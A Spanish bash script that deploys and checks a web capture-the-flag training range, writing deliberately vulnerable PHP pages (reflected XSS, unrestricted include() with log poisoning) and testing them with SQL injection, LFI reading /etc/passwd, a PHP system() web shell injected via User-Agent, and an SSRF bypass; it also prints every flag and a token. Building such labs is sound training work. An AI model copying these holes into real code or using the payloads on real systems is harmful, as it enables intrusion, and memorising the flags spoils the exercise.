#!/bin/bash
# =============================================================================
# CTF MGP — FIX DEFINITIVO
# Cambios:
#   - Reto 2 XSS  → cambia de :8080 a :8181 (puerto libre)
#   - Reto 4 LFI  → corrige la lógica del include para /etc/passwd
#   - Limpia el conflicto del VirtualHost :8080
# Ejecutar: sudo bash fix_definitivo.sh
# =============================================================================
set -e

VERDE="\e[32m"; AMARILLO="\e[33m"; ROJO="\e[31m"
AZUL="\e[34m"; NEGRITA="\e[1m"; RESET="\e[0m"

[ "$EUID" -ne 0 ] && { echo -e "${ROJO}Ejecutar como root: sudo bash $0${RESET}"; exit 1; }

# Puerto nuevo para XSS — libre en Ubuntu 24.04 por defecto
XSS_PORT=8181

echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   CTF MGP — Fix Definitivo  │  Ubuntu 24.04 LTS             ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# =============================================================================
# DIAGNÓSTICO: qué ocupa :8080
# =============================================================================
echo -e "${AMARILLO}[DIAG] Identificando conflicto en :8080...${RESET}"
echo -e "    → Sites que escuchan en 8080:"
grep -r "8080" /etc/apache2/sites-enabled/ 2>/dev/null || echo "    (ninguno detectado via grep)"
echo -e "    → Todos los VirtualHosts activos:"
apache2ctl -S 2>/dev/null | grep -E "port|namevhost" | head -20 || true
echo -e "    → Proceso usando :8080:"
ss -tlnp 2>/dev/null | grep ":8080" || echo "    (ninguno)"

# =============================================================================
# FIX 1 — LIMPIAR :8080 COMPLETAMENTE
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 1] Limpiando puerto :8080 de Apache...${RESET}"

# Deshabilitar xss-ctf viejo (estaba en :8080)
a2dissite xss-ctf.conf 2>/dev/null || true

# Quitar cualquier referencia a 8080 en ports.conf
sed -i '/^Listen 8080/d' /etc/apache2/ports.conf
echo -e "${VERDE}    [OK] :8080 eliminado de ports.conf${RESET}"

# Verificar si algún otro site menciona 8080 y limpiarlo
for SITE in /etc/apache2/sites-enabled/*.conf; do
    if grep -q "8080" "$SITE" 2>/dev/null; then
        echo -e "${AMARILLO}    [WARN] $SITE menciona 8080 — deshabilitando${RESET}"
        SITENAME=$(basename "$SITE")
        a2dissite "$SITENAME" 2>/dev/null || true
    fi
done
echo -e "${VERDE}    [OK] Conflictos de :8080 eliminados${RESET}"

# =============================================================================
# FIX 2 — RETO 2 XSS: nuevo VirtualHost en :${XSS_PORT}
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 2] Reto 2 — XSS: configurando en puerto ${XSS_PORT}...${RESET}"

# Añadir nuevo puerto
grep -q "^Listen ${XSS_PORT}" /etc/apache2/ports.conf || \
    echo "Listen ${XSS_PORT}" >> /etc/apache2/ports.conf
echo -e "${VERDE}    [OK] Listen ${XSS_PORT} añadido a ports.conf${RESET}"

# Nuevo VirtualHost
cat > /etc/apache2/sites-available/xss-ctf.conf <<APACHEEOF
<VirtualHost *:${XSS_PORT}>
    ServerName 192.168.125.150
    DocumentRoot /var/www/html/xss
    DirectoryIndex index.php index.html

    <Directory /var/www/html/xss>
        Options -Indexes -FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    ErrorLog  \${APACHE_LOG_DIR}/xss_error.log
    CustomLog \${APACHE_LOG_DIR}/xss_access.log combined
</VirtualHost>
APACHEEOF

a2ensite xss-ctf.conf 2>/dev/null || true

# Asegurar archivos PHP frescos
mkdir -p /var/www/html/xss

cat > /var/www/html/xss/index.php <<'PHPEOF'
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Fast-Ship — Rastreo de Paquetes</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#f4f6f8;font-family:'Segoe UI',sans-serif;color:#1a1a2e}
  header{background:#1a1a2e;color:#fff;padding:16px 40px;
         display:flex;align-items:center;gap:16px}
  header h1{font-size:22px;font-weight:700;letter-spacing:1px}
  header span{font-size:12px;color:#a0aec0}
  .hero{background:#16213e;color:#fff;padding:60px 40px;text-align:center}
  .hero h2{font-size:32px;margin-bottom:12px}
  .hero p{color:#a0aec0;font-size:15px;margin-bottom:32px}
  .search-box{display:flex;max-width:520px;margin:0 auto}
  .search-box input{flex:1;padding:14px 18px;border:none;
    border-radius:8px 0 0 8px;font-size:15px;outline:none}
  .search-box button{padding:14px 24px;background:#e94560;color:#fff;
    border:none;border-radius:0 8px 8px 0;cursor:pointer;
    font-size:15px;font-weight:600}
  footer{text-align:center;padding:20px;color:#a0aec0;font-size:12px;
         border-top:1px solid #e2e8f0}
</style>
</head>
<body>
<header>
  <div>
    <h1>&#128666; Fast-Ship</h1>
    <span>Logística &amp; Rastreo Internacional</span>
  </div>
</header>
<div class="hero">
  <h2>Rastrea tu paquete en tiempo real</h2>
  <p>Ingresa el número o nombre de tu envío para ver su estado</p>
  <form class="search-box" action="search.php" method="GET">
    <input type="text" name="query"
           placeholder="Número de guía o remitente...">
    <button type="submit">Buscar</button>
  </form>
</div>
<footer>Fast-Ship Logistics &copy; 2026 — Sistema de rastreo v2.1.4</footer>
</body>
</html>
PHPEOF

cat > /var/www/html/xss/search.php <<'PHPEOF'
<?php
// Flag en cookie — participante la obtiene ejecutando XSS
header("Set-Cookie: session_flag=Comciberdef{xss_reflected_2026_found}; path=/");
$query = $_GET['query'] ?? '';
// *** VULNERABLE: echo sin htmlspecialchars ***
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Fast-Ship — Resultados</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#f4f6f8;font-family:'Segoe UI',sans-serif;color:#1a1a2e}
  header{background:#1a1a2e;color:#fff;padding:16px 40px;
         display:flex;align-items:center;justify-content:space-between}
  header h1{font-size:20px;font-weight:700}
  .container{max-width:760px;margin:40px auto;padding:0 24px}
  .result-box{background:#fff;border-radius:12px;padding:32px;
              box-shadow:0 2px 12px rgba(0,0,0,.07)}
  .result-box h2{font-size:18px;margin-bottom:8px;color:#2d3748}
  .query-echo{background:#edf2f7;border-left:4px solid #e94560;
              padding:14px 18px;border-radius:0 8px 8px 0;
              font-size:15px;margin:16px 0;color:#4a5568}
  .no-result{color:#718096;font-size:14px;margin-top:16px}
  .back{display:inline-block;margin-top:24px;color:#e94560;
        font-size:14px;text-decoration:none}
</style>
</head>
<body>
<header>
  <h1>&#128666; Fast-Ship</h1>
  <a href="index.php" style="color:#a0aec0;font-size:13px;text-decoration:none">
    &#8592; Inicio
  </a>
</header>
<div class="container">
  <div class="result-box">
    <h2>Resultados de búsqueda</h2>
    <p style="font-size:13px;color:#718096">Buscaste:</p>
    <!-- PUNTO VULNERABLE -->
    <div class="query-echo"><?php echo $query; ?></div>
    <div class="no-result">
      No se encontraron resultados. Verifica el número de guía.
    </div>
    <a class="back" href="index.php">&#8592; Nueva búsqueda</a>
  </div>
</div>
</body>
</html>
PHPEOF

chown -R www-data:www-data /var/www/html/xss
chmod -R 750 /var/www/html/xss
echo -e "${VERDE}    [OK] Archivos XSS escritos${RESET}"

# =============================================================================
# FIX 3 — RETO 4 LFI: corregir index.php para que /etc/passwd funcione
# El problema: strpos('/../../../etc/passwd', '..') devuelve 1 (truthy)
# pero strpos con path absoluto falla porque la lógica tiene un bug.
# Solución: reescribir la lógica del include de forma más directa
# =============================================================================
echo ""
echo -e "${AMARILLO}[FIX 3] Reto 4 — LFI: corrigiendo lógica de include...${RESET}"

cat > /var/www/html/lfi/index.php <<'PHPEOF'
<?php
// Módulo de logging de accesos
$log_file = '/var/log/app/access.log';
$ip       = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ua       = $_SERVER['HTTP_USER_AGENT'] ?? '-';
$page     = $_GET['page'] ?? '';
$uri      = $_SERVER['REQUEST_URI'] ?? '/';
$ts       = date('Y-m-d H:i:s');

// *** LOG POISONING POINT ***
// El User-Agent se escribe tal cual — sin sanitizar
$log_entry = "[$ts] $ip GET $uri \"$ua\" 200\n";
@file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// *** LFI VULNERABLE ***
// include() directo con el parámetro $page sin restricciones
if ($page !== '') {
    @include($page);
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>COMCIBERDEF — Visor de Logs de Acceso</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:#1a1a2e;color:#c9d1d9;font-family:'Segoe UI',sans-serif;min-height:100vh}
  header{background:#16213e;border-bottom:2px solid #0f3460;
         padding:14px 32px;display:flex;align-items:center;gap:16px}
  header h1{font-size:18px;color:#e94560;font-weight:700;letter-spacing:1px}
  header span{font-size:11px;color:#718096;margin-left:auto}
  .layout{display:flex;min-height:calc(100vh - 52px)}
  .sidebar{width:220px;background:#16213e;border-right:1px solid #0f3460;padding:20px}
  .sidebar h3{font-size:11px;text-transform:uppercase;letter-spacing:1px;
              color:#718096;margin-bottom:12px}
  .sidebar a{display:block;padding:9px 12px;border-radius:6px;color:#a0aec0;
             font-size:13px;text-decoration:none;margin-bottom:4px;transition:.15s}
  .sidebar a:hover,.sidebar a.active{background:#0f3460;color:#fff}
  .main{flex:1;padding:28px}
  .content-area{background:#16213e;border:1px solid #0f3460;border-radius:10px;
                padding:28px;line-height:1.7}
  .content-area h2{color:#e94560;margin-bottom:14px;font-size:18px}
  .content-area p{color:#a0aec0;font-size:14px;margin-bottom:8px}
  .content-area code{background:#0f3460;padding:2px 6px;border-radius:4px;
                     font-family:monospace;color:#63b3ed;font-size:13px}
  .meta{font-size:11px;color:#4a5568;margin-top:24px;padding-top:12px;
        border-top:1px solid #0f3460}
</style>
</head>
<body>
<header>
  <h1>&#9632; COMCIBERDEF — Log Viewer v2.3.1</h1>
  <span>SISTEMA INTERNO — ACCESO RESTRINGIDO</span>
</header>
<div class="layout">
  <div class="sidebar">
    <h3>Navegación</h3>
    <a href="?page=pages/home.php"
       class="<?= ($page==='pages/home.php')?'active':'' ?>">&#127968; Inicio</a>
    <a href="?page=pages/news.php"
       class="<?= ($page==='pages/news.php')?'active':'' ?>">&#128240; Novedades</a>
    <a href="?page=pages/contact.php"
       class="<?= ($page==='pages/contact.php')?'active':'' ?>">&#128222; Soporte</a>
    <div style="margin-top:24px;padding-top:16px;border-top:1px solid #0f3460">
      <h3>Sistema</h3>
      <a href="?page=pages/home.php">&#128196; Ver Logs</a>
    </div>
  </div>
  <div class="main">
    <?php if ($page === ''): ?>
    <div class="content-area">
      <h2>Bienvenido</h2>
      <p>Selecciona una sección del menú o accede con
         <code>?page=pages/home.php</code></p>
      <p style="margin-top:12px">
        <strong>Nota:</strong> El módulo de logs usa
        <code>/var/log/app/access.log</code>
      </p>
    </div>
    <?php endif; ?>
    <div class="meta">
      Log: <?= htmlspecialchars($log_file) ?> &nbsp;|&nbsp;
      IP: <?= htmlspecialchars($ip) ?>
    </div>
  </div>
</div>
</body>
</html>
PHPEOF

chown -R www-data:www-data /var/www/html/lfi
echo -e "${VERDE}    [OK] index.php LFI reescrito — include() directo sin filtros${RESET}"

# =============================================================================
# REINICIAR APACHE Y VERIFICAR
# =============================================================================
echo ""
echo -e "${AMARILLO}[*] Reiniciando Apache...${RESET}"

if apache2ctl configtest 2>&1 | grep -q "Syntax OK"; then
    systemctl restart apache2
    sleep 2
    echo -e "${VERDE}    [OK] Apache reiniciado${RESET}"
else
    echo -e "${ROJO}    [ERROR] Configuración Apache inválida:${RESET}"
    apache2ctl configtest 2>&1
    exit 1
fi

echo -e "${AMARILLO}    → VirtualHosts activos tras el fix:${RESET}"
apache2ctl -S 2>/dev/null | grep -E "port|namevhost" | head -20 || true

# =============================================================================
# VALIDACIÓN FINAL COMPLETA
# =============================================================================
echo ""
echo -e "${AZUL}${NEGRITA}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║               VALIDACIÓN FINAL POST-FIX                     ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

PASS=0; FAIL=0
ok()   { echo -e "  ${VERDE}[OK]${RESET}   $1"; PASS=$((PASS+1)); }
fail() { echo -e "  ${ROJO}[FAIL]${RESET} $1"; FAIL=$((FAIL+1)); }

chk_http() {
    local CODE
    CODE=$(curl -s -o /dev/null -w "%{http_code}" "$2" 2>/dev/null || echo "000")
    [ "$CODE" = "$3" ] && ok "$1 (HTTP $CODE)" || fail "$1 (esperado $3, got $CODE)"
}
chk_body() {
    local BODY
    BODY=$(curl -s "$2" 2>/dev/null || echo "")
    echo "$BODY" | grep -q "$3" && ok "$1" || fail "$1"
}

echo -e "${AMARILLO}── Reto 1: SQLi Login ──────────────────────────────${RESET}"
chk_http "Portal /sqli-login/" "http://localhost/sqli-login/" "200"
ROWS=$(mysql -u root -e "SELECT COUNT(*) FROM sqli_db.users;" -sN 2>/dev/null || echo "0")
[ "$ROWS" -eq 5 ] && ok "sqli_db.users → $ROWS filas" || fail "sqli_db.users → $ROWS filas"
BODY=$(curl -sL --data "username=%27+OR+1%3D1+LIMIT+4%2C1+--+-&password=x" \
    "http://localhost/sqli-login/" 2>/dev/null || echo "")
echo "$BODY" | grep -q "Comciberdef{sqli_bypass_2026_ok}" && \
    ok "SQLi bypass → flag OK" || fail "SQLi bypass → flag no encontrada"

echo ""
echo -e "${AMARILLO}── Reto 2: XSS Reflejado (puerto ${XSS_PORT}) ──────────────${RESET}"
chk_http "Portal :${XSS_PORT}/xss/" \
    "http://localhost:${XSS_PORT}/xss/" "200"
chk_body "search.php refleja input" \
    "http://localhost:${XSS_PORT}/xss/search.php?query=XSSTEST2026" "XSSTEST2026"
HDRS=$(curl -sI \
    "http://localhost:${XSS_PORT}/xss/search.php?query=x" 2>/dev/null || echo "")
echo "$HDRS" | grep -qi "Comciberdef{xss_reflected_2026_found}" && \
    ok "Cookie session_flag presente" || fail "Cookie session_flag ausente"

echo ""
echo -e "${AMARILLO}── Reto 3: SQLi Ciega ───────────────────────────────${RESET}"
chk_http "Portal /sqli-blind/"  "http://localhost/sqli-blind/" "200"
chk_body "Oráculo TRUE"  "http://localhost/sqli-blind/?id=1+AND+1%3D1" "encontrado"
chk_body "Oráculo FALSE" "http://localhost/sqli-blind/?id=1+AND+1%3D2" "no disponible"
HASH=$(mysql -u root -e \
    "SELECT password_hash FROM blind_db.moderators WHERE username='paco_admin';" \
    -sN 2>/dev/null || echo "X")
EXP=$(echo -n "NavalCiber2026" | md5sum | cut -d' ' -f1)
[ "$HASH" = "$EXP" ] && ok "Hash MD5 paco_admin correcto" || \
    fail "Hash MD5 incorrecto ($HASH)"
grep -q "NavalCiber2026" /home/rangeadmin/wordlist.txt 2>/dev/null && \
    ok "Wordlist contiene NavalCiber2026" || fail "Wordlist sin NavalCiber2026"

echo ""
echo -e "${AMARILLO}── Reto 4: LFI + Log Poisoning ──────────────────────${RESET}"
chk_http "Portal /lfi/" "http://localhost/lfi/" "200"
chk_body "LFI lee /etc/passwd" \
    "http://localhost/lfi/?page=../../../etc/passwd" "root:x"
[ -f /var/log/app/access.log ] && ok "Log existe" || fail "Log no existe"
sudo -u www-data test -w /var/log/app/access.log 2>/dev/null && \
    ok "Log escribible por www-data" || fail "Log no escribible"
[ -f /flag.txt ] && ok "/flag.txt existe" || fail "/flag.txt no existe"
curl -s -A '<?php system($_GET["cmd"]); ?>' \
    "http://localhost/lfi/?page=pages/home.php" > /dev/null 2>&1
sleep 0.5
chk_body "Log Poisoning + RCE → /flag.txt" \
    "http://localhost/lfi/?page=/var/log/app/access.log&cmd=cat+/flag.txt" \
    "Comciberdef"
# Limpiar log post-test
printf '[2026-01-15 08:12:04] 192.168.125.40 GET /lfi/ "Mozilla/5.0" 200\n' \
    > /var/log/app/access.log
chown www-data:www-data /var/log/app/access.log

echo ""
echo -e "${AMARILLO}── Reto 5: SSRF ─────────────────────────────────────${RESET}"
META_ST=$(systemctl is-active ctf-metadata 2>/dev/null || echo "inactive")
[ "$META_ST" = "active" ] && ok "ctf-metadata activo" || fail "ctf-metadata inactivo"
STOR_ST=$(systemctl is-active ctf-storage 2>/dev/null || echo "inactive")
[ "$STOR_ST" = "active" ] && ok "ctf-storage activo" || fail "ctf-storage inactivo"
chk_http "Metadata :8888" "http://127.0.0.1:8888/" "200"
chk_http "Storage :9999 sin token → 401" "http://127.0.0.1:9999/secret/flag.txt" "401"
TOKEN="MGP2026-IAM-xK9mN3pQ7rT1vY5wZ8"
FBODY=$(curl -s -H "Authorization: Bearer ${TOKEN}" \
    "http://127.0.0.1:9999/secret/flag.txt" 2>/dev/null || echo "")
echo "$FBODY" | grep -q "Comciberdef{ssrf_bypass_2026_master}" && \
    ok "Storage entrega flag con token" || fail "Storage no entrega flag"
chk_body "SSRF bypass 0.0.0.0 obtiene token" \
    "http://localhost/ssrf/preview.php?url=http://0.0.0.0:8888/latest/meta-data/iam/security-credentials/mgp-role" \
    "Token"
chk_http "Portal /ssrf/" "http://localhost/ssrf/" "200"

# =============================================================================
# RESUMEN
# =============================================================================
echo ""
TOTAL=$((PASS+FAIL))
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
printf "${NEGRITA}  RESULTADO: %d/%d controles pasados\n${RESET}" "$PASS" "$TOTAL"
if [ "$FAIL" -eq 0 ]; then
    echo -e "${VERDE}${NEGRITA}  ✓ TODOS LOS RETOS WEB DESPLEGADOS — LISTOS PARA EL CTF${RESET}"
else
    echo -e "${ROJO}${NEGRITA}  ✗ $FAIL controles fallaron${RESET}"
    echo ""
    echo -e "${AMARILLO}  Diagnóstico:${RESET}"
    echo "    apache2ctl -S"
    echo "    tail -20 /var/log/apache2/xss_error.log"
    echo "    curl -v http://localhost:${XSS_PORT}/xss/"
fi
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
echo ""
echo -e "${NEGRITA}  URLs participantes (ACTUALIZADO):${RESET}"
echo "  R1 → http://192.168.125.150/sqli-login/       │ Comciberdef{sqli_bypass_2026_ok}"
echo "  R2 → http://192.168.125.150:${XSS_PORT}/xss/        │ Comciberdef{xss_reflected_2026_found}"
echo "  R3 → http://192.168.125.150/sqli-blind/       │ Comciberdef{NavalCiber2026}"
echo "  R4 → http://192.168.125.150/lfi/              │ Comciberdef{lfi_log_poison_rce_2026}"
echo "  R5 → http://192.168.125.150/ssrf/             │ Comciberdef{ssrf_bypass_2026_master}"
echo -e "${AZUL}${NEGRITA}══════════════════════════════════════════════════════════════${RESET}"
